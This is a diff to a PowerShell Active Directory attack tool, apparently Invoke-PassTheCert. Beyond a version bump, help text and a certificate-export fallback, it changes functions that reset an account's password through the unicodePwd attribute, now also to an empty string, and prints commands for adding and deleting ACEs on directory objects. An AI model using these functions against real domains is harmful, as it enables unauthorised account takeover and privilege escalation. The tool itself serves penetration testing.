@@ -30,7 +30,7 @@ function _ShowBanner {
     Write-Host -ForegroundColor Red     "   _| || | | \ V / (_) |   <  __/ |______| "
     Write-Host -ForegroundColor Red     "   \___/_| |_|\_/ \___/|_|\_\___|          "
     Write-Host -ForegroundColor Red     ""
-    Write-Host -ForegroundColor Red     "   v1.7.3 "
+    Write-Host -ForegroundColor Red     "   v1.7.4 "
     Write-Host -ForegroundColor Red     "  ______            _____ _          _____           _     "
     Write-Host -ForegroundColor Red     "  | ___ \          |_   _| |        /  __ \         | |    "
     Write-Host -ForegroundColor Red     "  | |_/ /___ ___ ___ | | | |__   ___| /  \/ ___ _ __| |_   "
@@ -69,6 +69,14 @@ function _Helper-ShowHelpOfFunction {
             
             - Default to 'Detailed'.
 
+        .PARAMETER ScriptPath
+
+            [System.String] 
+            
+            The path of the PowerShell script file (Optional).
+            
+            - Default to 'Invoke-PassTheCert.ps1'.
+
         .PARAMETER TranslateToInvokePassTheCertSyntax
 
             [System.Boolean] 
@@ -81,25 +89,25 @@ function _Helper-ShowHelpOfFunction {
 
             _Helper-ShowHelpOfFunction -FunctionName '_Filter' -TranslateToInvokePassTheCertSyntax $false
 
-            Shows the Detailed Get-Help of function `_Filter` in the specified PowerShell script, using the `_Filter` function's own syntax.
+            Shows the Detailed Get-Help of function `_Filter` in the current PowerShell script (default), using the `_Filter` function's own syntax.
 
         .EXAMPLE
 
             _Helper-ShowHelpOfFunction -FunctionName '_Filter' -h
 
-            Shows the Detailed Get-Help of function `_Filter` in the specified PowerShell script, translating its examples into the `Invoke-PassTheCert` syntax.
+            Shows the Detailed Get-Help of function `_Filter` in the current PowerShell script (default), translating its examples into the `Invoke-PassTheCert` syntax.
 
         .EXAMPLE
 
             _Helper-ShowHelpOfFunction -FunctionName '_Filter' -he
 
-            Shows the Examples Get-Help of function `_Filter` in the specified PowerShell script, translating its examples into the `Invoke-PassTheCert` syntax.
+            Shows the Examples Get-Help of function `_Filter` in the current PowerShell script (default), translating its examples into the `Invoke-PassTheCert` syntax.
 
         .EXAMPLE
 
             _Helper-ShowHelpOfFunction -FunctionName '_Filter' -hh
 
-            Shows the Full Get-Help of function `_Filter` in the specified PowerShell script, translating its examples into the `Invoke-PassTheCert` syntax.
+            Shows the Full Get-Help of function `_Filter` in the current PowerShell script (default), translating its examples into the `Invoke-PassTheCert` syntax.
 
     #>
     
@@ -6652,20 +6660,23 @@ function _Helper-ExportCertificateToFile {
             Default { Write-Host "[!] X509ContentType '$ExportContentType' Not Recognized !"; return; }
         }
 
-        #Set-Content -Path $ExportPath -AsByteStream -Force -Value (
-        #    $Certificate.Export(
-        #        $X509ContentType,
-        #        $SecureString
-        #    )
-        #)
-
-        [System.IO.File]::WriteAllBytes(
-            $ExportPath, 
-            $Certificate.Export(
-                $X509ContentType, 
-                $ExportPassword
+        # Trying either Set-Content, or the WriteAllBytes() if the former fails.
+        try {
+            Set-Content -Path $ExportPath -AsByteStream -Force -Value (
+                $Certificate.Export(
+                    $X509ContentType,
+                    $SecureString
+                )
             )
-        )
+        } catch {
+            [System.IO.File]::WriteAllBytes(
+                $ExportPath, 
+                $Certificate.Export(
+                    $X509ContentType, 
+                    $ExportPassword
+                )
+            )
+        }
 
         Write-Host "[+] Successfully Generated And Exported Self-Signed Certificate To File '$ExportPath' Of Type '$ExportContentType', $PasswordString"
 
@@ -7913,8 +7924,7 @@ function _LDAPExtendedOperationPasswordModify {
     #)
 
     Write-Host "[!] 'Password Modify' LDAP Extended Operation (RFC3062) Not Implemented Yet :("
-    Write-Host "[*] [Alternative] Invoke-PassTheCert -Action 'UpdatePasswordOfIdentity' -LdapConnection"'$LdapConnection'"-IdentityDN '$(_GetSubjectDNFromLdapConnection -LdapConnection $LdapConnection)' -NewPassword $NewPassword"
-    return
+    Write-Host "[*] [Alternative] Invoke-PassTheCert -Action 'UpdatePasswordOfIdentity' -LdapConnection"'$LdapConnection'"-Identity '$(_GetSubjectDNFromLdapConnection -LdapConnection $LdapConnection)' -NewPassword $NewPassword"
 }
 
 
@@ -8410,7 +8420,7 @@ function _Filter {
                         $AddMember = $true; 
                         # https://learn.microsoft.com/en-us/windows/win32/adschema/a-accountexpires
                         if ($Property.Value -in @('0', '9223372036854775807')) { 
-                            $NewMember = 'Never Expires'
+                            $NewMember = 'Never'
                         }
                         else { 
                             $NewMember = _Helper-GetReadableValueOfString -Type 'fileTime' -String $Property.Value 
@@ -9901,7 +9911,6 @@ function _CreateInboundSDDL {
     } else {
         Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'DeleteInboundACE' -LdapConnection `$LdapConnection -IdentitySID '$IdentitySID' -Target '$TargetDN' -AceQualifier '$ACETypeString' -AccessMaskNames '$(_Helper-GetNamesOfACEAccessMaskValue -Value $AccessMaskValue)'"
     }
-    return
 }
 
 
@@ -9933,6 +9942,12 @@ function _UpdatePasswordOfIdentity {
 
         .EXAMPLE
 
+            _UpdatePasswordOfIdentity -LdapConnection $LdapConnection -IdentityDN 'CN=Wordy WP. PRESS,CN=Users,DC=X' -NewPassword ''
+
+            Updates the password of account `Wordy WP. PRESS` to an empty string.
+
+        .EXAMPLE
+
             _UpdatePasswordOfIdentity -LdapConnection $LdapConnection -IdentityDN 'CN=Wordy WP. PRESS,CN=Users,DC=X' -NewPassword 'NewP@ssw0rd123!'
 
             Updates the password of account `Wordy WP. PRESS` to `NewP@ssw0rd123!`
@@ -9957,14 +9972,20 @@ function _UpdatePasswordOfIdentity {
         [System.String]$IdentityDN,
 
         [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the new password of the targeted account")]
-        [System.String]$NewPassword
+        $NewPassword
     )
     
     _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+    
     Write-Verbose "[*] Updating Password Of Account '$IdentityDN'..."
+    
     _OverwriteValueInAttribute -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute 'unicodePwd' -Value ([System.Text.Encoding]::Unicode.GetBytes("`"$NewPassword`""))
-    Write-Host "[+] Successfully Updated Password Of '$IdentityDN' To: $NewPassword"
-    return
+
+    if ($NewPassword -eq '') {
+        Write-Host "[+] Successfully Updated Password Of '$IdentityDN' To An Empty String !"
+    } else {
+        Write-Host "[+] Successfully Updated Password Of '$IdentityDN' To: $NewPassword"
+    }
 }
 
 
@@ -10060,7 +10081,6 @@ function _OverwriteValueInAttribute {
 
     Write-Host "[+] Successfully Overwritten Value Of '$ObjectDN':'$Attribute' To '$Value' !"
     Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$ObjectDN' -SearchScope Base -Properties '$Attribute' |fl"
-    return
 }
 
 
@@ -10156,8 +10176,6 @@ function _AddValueInAttribute {
     Write-Host "[+] Successfully Added Value '$Value' In Attribute '$ObjectDN':'$Attribute' !"
     Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$ObjectDN' -SearchScope Base -Properties '$Attribute' |fl"
     Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'RemoveValueInAttribute' -LdapConnection `$LdapConnection -Object '$ObjectDN' -Attribute '$Attribute' -Value '$Value'"
-
-    return
 }
 
 
@@ -10253,7 +10271,6 @@ function _RemoveValueInAttribute {
     Write-Host "[+] Successfully Removed Value '$Value' In Attribute '$ObjectDN':'$Attribute' !"
     Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$ObjectDN' -SearchScope Base -Properties '$Attribute' |fl"
     Write-Host "[*] [Restore] Invoke-PassTheCert -Action 'AddValueInAttribute' -LdapConnection `$LdapConnection -Object '$ObjectDN' -Attribute '$Attribute' -Value '$Value'"
-    return
 }
 
 
@@ -10341,7 +10358,6 @@ function _ClearAttribute {
     
     Write-Host "[+] Successfully Cleared Attribute '$ObjectDN':'$Attribute' !"
     Write-Host "[*] [Check] Invoke-PassTheCert -Action 'Filter' -LdapConnection `$LdapConnection -SearchBase '$ObjectDN' -SearchScope Base -Properties '$Attribute' |fl"
-    return
 }
 
 
